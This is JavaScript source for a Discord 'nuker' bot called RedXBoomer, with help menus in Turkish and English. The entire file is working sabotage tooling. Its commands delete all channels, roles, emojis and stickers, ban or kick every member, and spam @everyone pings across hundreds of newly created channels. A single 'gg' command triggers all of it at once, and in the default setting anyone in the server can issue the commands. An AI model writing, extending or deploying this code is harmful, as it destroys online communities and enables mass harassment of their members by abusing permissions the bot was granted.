const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
                    ██████╗░ ███████╗ ██████╗░ ██╗░░██╗
                    ██╔══██╗ ██╔════╝ ██╔══██╗ ╚██╗██╔╝
                    ██████╔╝ █████╗░░ ██║░░██║ ░╚███╔╝░
                    ██╔══██╗ ██╔══╝░░ ██║░░██║ ░██╔██╗░
                    ██║░░██║ ███████╗ ██████╔╝ ██╔╝╚██╗
                    ╚═╝░░╚═╝ ╚══════╝ ╚═════╝░ ╚═╝░░╚═╝
                    Botİsim: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "RedXBoomer", type: "PLAYİNG" });
});

hata=('Bu aracın komutlarından hiçbirini kullanma yetkiniz yok.');

nuker.on("messageCreate", (message) => {

    // Help Embed
    const yardim = new MessageEmbed()
        .setDescription(`**|- RedXBoomer -|**
    \n**Kanal Aç ;**
    ${prefix}kp [miktar] (yazı) örn: \`${prefix}kp 5 test\`\n
    **Kanal Aç ve Pingle ;**
    ${prefix}kap [miktar] (yazı), {mesaj} örn: \`${prefix}kap 5 test, testing\`\n
    **Rol Aç ;**
    ${prefix}rp [miktar] (yazı) örn: \`${prefix}rp 5 test\`\n
    **Kanalları Sil ;**
    ${prefix}ks\n
    **Rolleri Sil ;**
    ${prefix}rs\n
    **Emojileri Sil ;**
    ${prefix}es\n
    **Stickerları Sil ;**
    ${prefix}ss\n
    **Herkesi At ;**
    ${prefix}at\n
    **Herkesi Banla ;**
    ${prefix}ban\n
    **İçinden Geç ;**
    ${prefix}gg
    `)
        .setFooter(`© RedXBoomer`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());
    
    const help = new MessageEmbed()
        .setDescription(`**|- RedXBoomer -|**
    \n**Mass Channels ;**
    ${prefix}kp [amount] (text) örn: \`${prefix}kp 5 test\`\n
    **Mass Channels and Ping ;**
    ${prefix}kap [amount] (text), {message} örn: \`${prefix}kap 5 test, testing\`\n
    **Mass Roles ;**
    ${prefix}rp [amount] (text) örn: \`${prefix}rp 5 test\`\n
    **Delete All Channels ;**
    ${prefix}ks\n
    **Delete All Roles ;**
    ${prefix}rs\n
    **Delete All Emotes ;**
    ${prefix}es\n
    **Delete All Stickers ;**
    ${prefix}ss\n
    **Mass Kick ;**
    ${prefix}at\n
    **Mass Ban ;**
    ${prefix}ban\n
    **Boom ;**
    ${prefix}gg
    `)
        .setFooter(`© RedXBoomer`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());
    
    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "yardım")) {
            message.channel.send({embeds: [yardim]})
        }

        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "kp")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "ks",prefix + "gg")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "kap")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "rp")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "rs", prefix + "gg")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ss", prefix + "gg")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "es", prefix + "gg")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "ban", prefix + "gg")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "at" , prefix + "gg")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }

    } else {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "yardım")) {
            if (message.author.id != userID) return message.reply(hata);
            message.channel.send({embeds: [yardim]})
        }

        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply(hata);
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "kp")) {
            if (message.author.id != userID) return message.reply(hata);
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "ks")) {
            if (message.author.id != userID) return message.reply(hata);
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "kap")) {
            if (message.author.id != userID) return message.reply(hata);
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "rp")) {
            if (message.author.id != userID) return message.reply(hata);
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "rs")) {
            if (message.author.id != userID) return message.reply(hata);
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ss")) {
            if (message.author.id != userID) return message.reply(hata);
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "es")) {
            if (message.author.id != userID) return message.reply(hata);
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "ban")) {
            if (message.author.id != userID) return message.reply(hata);
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "at")) {
            if (message.author.id != userID) return message.reply(hata);
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
        // sikgitsinamk
        if (message.content.startsWith(prefix + "gg")) {
            if (message.author.id != userID) return message.reply(hata);
             BanAll().catch((err) => {
                message.reply(err);
            });
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
            MassRoles(99999, "@everyone").catch((err) => {
                message.reply(err);
            });
        }
    }

    // Nuking Functions

    /**
     * Excessive amount of channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argümanlar: Kanalları toplu hale getirmek istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tür Hatası: Miktar için bir sayı kullanın");
            if (amount > 500) return reject("Tutar Hatası: Maksimum lonca kanalı boyutu 500 | İpucu: 500'den küçük bir sayı kullanın");
            if (!channelPerms) return reject("Bot İzinleri Eksik: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} buradaydı`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata bulundu: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata bulundu: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Excessive amount of channels and mentions
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent when everyone is mentioned
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argümanlar: Kanalları toplu hale getirmek istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tür Hatası: Miktar için bir sayı kullanın");
            if (amount > 500) return reject("Tutar Hatası: Maksimum lonca kanalı boyutu 500 | İpucu: 500'den küçük bir sayı kullanın");
            if (!channelPerms) return reject("Bot İzinleri Eksik: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Belirtilmemiş Argümanlar: Toplu olarak bahsetmek istediğiniz mesajı belirtin");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} buradaydı`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata bulundu: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata bulundu: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literally not possible but lol?
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Deletes all channels in a guild
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot İzinleri Eksik: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
            resolve();
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Bağımsız Değişkenler: Rolleri toplu hale getirmek istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tür Hatası: Miktar için bir sayı kullanın");
            if (!rolePerms) return reject("Bot İzinleri Eksik: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Hata bulundu: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Hata bulundu: " + err)) })
                }
            }
        })
    }

    /**
     * Deletes all roles
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot İzinleri Eksik: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Hata bulundu: " + err)) }))
        });
    }

    /**
     * Deletes all emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot İzinleri Eksik: 'MANAGE_ROLES'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("EHata bulundu: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot İzinleri Eksik: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Hata bulundu: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot İzinleri Eksik: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply(arrayOfIDs.length + " Kişi BUlundu.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banlanıyor...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Hata bulundu: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} Banlandı.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot İzinleri Eksik: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply(arrayOfIDs.length + " Kişi Bulundu.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Atılıyor...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Hata bulundu: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} atıldı.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
